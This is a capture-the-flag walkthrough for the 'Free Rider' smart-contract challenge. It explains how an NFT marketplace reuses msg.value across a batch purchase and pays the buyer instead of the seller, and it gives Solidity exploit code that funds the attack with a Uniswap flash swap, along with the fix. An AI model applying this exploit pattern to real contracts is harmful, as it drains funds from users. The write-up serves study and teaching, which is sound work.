## Challenge 10 Walkthrough: Free Rider

### Vulnerability

There are two independent flaws in `FreeRiderNFTMarketplace`, and the exploit chains them.

#### Primary: per-call `msg.value` re-use

`buyMany` loops over `_buyOne`, but the payment check reads the single transaction-level `msg.value` on every iteration:

```solidity
function _buyOne(uint256 tokenId) private {
    uint256 priceToPay = offers[tokenId];
    if (priceToPay == 0) {
        revert TokenNotOffered(tokenId);
    }

    if (msg.value < priceToPay) {   // ← compares against the SAME msg.value each call
        revert InsufficientPayment();
    }

    --offersCount;

    DamnValuableNFT _token = token;
    _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

    payable(_token.ownerOf(tokenId)).sendValue(priceToPay);  // ← pays the NEW owner

    emit NFTBought(msg.sender, tokenId, priceToPay);
}
```

`msg.value` is fixed for the whole `buyMany` call, so a single payment of 15 ETH satisfies the check for all six 15-ETH NFTs.

#### Secondary: pays the buyer, not the seller

`safeTransferFrom` runs *before* `sendValue`, so by the time the marketplace looks up `_token.ownerOf(tokenId)` to pay the "seller", that address is already the **buyer**. The marketplace refunds the buyer 15 ETH for every NFT it just handed them.

Combined: pay 15 ETH once, receive all six NFTs *and* 6 × 15 = 90 ETH back.

The remaining obstacle is that the player only has 0.1 ETH. A Uniswap V2 flash swap supplies the 15 ETH of working capital for the duration of one transaction.

### Exploit

```solidity
function test_freeRider() public checkSolvedByPlayer {
    FreeRiderAttacker attacker = new FreeRiderAttacker(
        payable(address(weth)),
        address(uniswapPair),
        payable(address(marketplace)),
        address(nft),
        address(recoveryManager),
        player
    );
    attacker.attack();
}
```

**Inside the flow:**

**Step 1 — Flash-swap 15 WETH.** `pair.swap(15e18, 0, this, data)` borrows WETH (token0); non-empty `data` triggers the callback.

```solidity
pair.swap(15 ether, 0, address(this), abi.encode(uint256(1)));
```

**Step 2 — Buy all six NFTs for 15 ETH.** Unwrap the WETH and call `buyMany` once with 15 ETH; the per-call check passes for all six and the post-transfer payout refunds 90 ETH.

```solidity
weth.withdraw(amount0);
marketplace.buyMany{value: amount0}(ids);   // ids = [0,1,2,3,4,5]
```

**Step 3 — Claim the bounty.** Forward all six NFTs to the recovery manager, encoding `player` as the bounty recipient. The sixth `onERC721Received` releases the 45 ETH bounty to the player.

```solidity
bytes memory data = abi.encode(player);
for (uint256 i = 0; i < 6; i++) {
    nft.safeTransferFrom(address(this), recoveryManager, i, data);
}
```

**Step 4 — Repay the flash swap and sweep.** Re-wrap 15 WETH plus the 0.3% fee and return it to the pair, then forward the remaining ETH to the player.

```solidity
uint256 repay = amount0 + ((amount0 * 3) / 997) + 1; // ceil(amount0 * 1000/997)
weth.deposit{value: repay}();
weth.transfer(address(pair), repay);
player.call{value: address(this).balance}("");
```

```
attacker.attack()
    │
    └─> pair.swap(15 WETH out)
            └─> attacker.uniswapV2Call()
                    ├─ weth.withdraw(15) → 15 ETH
                    ├─ marketplace.buyMany([0..5]) {value: 15 ETH}
                    │     ├─ 6 NFTs transferred to attacker
                    │     └─ 90 ETH refunded to attacker (pays new owner)
                    ├─ 6 × safeTransferFrom(attacker → recoveryManager)
                    │     └─ 6th receipt: 45 ETH bounty → player
                    ├─ repay ~15.05 WETH to pair
                    └─ sweep remaining ETH → player
```

### Why It Works

The marketplace conflates the transaction-level `msg.value` with a per-item payment and settles the seller payout *after* transferring ownership, so a single payment buys every item and each "payout" is refunded to the buyer. The flash swap removes the only real constraint — the player's tiny ETH balance — by lending the purchase price for the length of one atomic transaction.

The fix is to track cumulative spend across the loop (require `msg.value` to cover the *sum* of prices, decrementing a running total) and to cache the seller address *before* `safeTransferFrom` so the payout goes to the actual seller.

This is a **payment-accounting flaw in a batch purchase** — one 15 ETH payment acquires six 15-ETH NFTs and is refunded 90 ETH, with flash-swapped capital making it free.
